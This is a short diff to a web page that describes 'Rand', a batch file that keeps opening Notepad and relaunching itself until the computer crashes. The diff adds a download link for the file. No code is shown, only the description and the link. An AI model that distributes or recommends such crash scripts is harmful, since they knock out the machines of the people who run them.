@@ -9,4 +9,4 @@ It was created by Spider Anongreyhat<br>
 <b>Rand</b><br>
 Rand is a batch file that opens unlimited notepad and its opens itself till pc crashes
 <br><br>
-Click <a href="">here</a> to download Rand
+Click <a href="https://www.mediafire.com/file/hje4x35bl0yr5re/Rand.bat/file">here</a> to download Rand
